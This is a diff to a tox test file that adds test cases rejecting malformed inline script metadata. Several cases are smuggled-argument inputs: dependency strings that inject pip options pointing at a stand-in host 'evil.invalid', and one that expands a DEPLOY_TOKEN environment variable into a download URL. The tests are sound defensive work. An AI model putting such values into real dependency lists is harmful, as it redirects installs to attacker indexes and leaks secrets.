@@ -120,13 +120,34 @@ def test_skip_env_install(tox_project: ToxProjectCreator) -> None:
             """),
             id="unclosed-list",
         ),
+        pytest.param(
+            '# /// script\n# dependencies = ["demo", "--index-url http://evil.invalid/simple"]\n# ///\n',
+            id="dependency-is-pip-option",
+        ),
+        pytest.param(
+            '# /// script\n# dependencies = ["-i http://evil.invalid/simple"]\n# ///\n',
+            id="dependency-is-short-pip-option",
+        ),
+        pytest.param(
+            '# /// script\n# dependencies = ["-r other.txt"]\n# ///\n',
+            id="dependency-is-requirements-include",
+        ),
+        pytest.param(
+            '# /// script\n# dependencies = ["demo @ https://example.invalid/${DEPLOY_TOKEN}/demo.whl"]\n# ///\n',
+            id="dependency-expands-env-var",
+        ),
+        pytest.param('# /// script\n# dependencies = "demo"\n# ///\n', id="dependencies-not-a-list"),
+        pytest.param("# /// script\n# dependencies = [1]\n# ///\n", id="dependency-not-a-string"),
+        pytest.param("# /// script\n# requires-python = 3\n# ///\n", id="requires-python-not-a-string"),
+        pytest.param('# /// script\n# requires-python = "not a spec"\n# ///\n', id="requires-python-invalid"),
     ],
 )
 def test_invalid_script_metadata(tox_project: ToxProjectCreator, script: str) -> None:
-    result, _ = _run(tox_project, {"tox.ini": _tox_ini(), "check.py": script})
+    result, execute_calls = _run(tox_project, {"tox.ini": _tox_ini(), "check.py": script})
     result.assert_failed()
     assert "invalid inline script metadata" in result.out, result.out
     assert "internal error" not in result.out
+    assert not [i for i in execute_calls.call_args_list if "install" in i[0][3].run_id]
 
 
 def test_missing_script_file(tox_project: ToxProjectCreator) -> None:
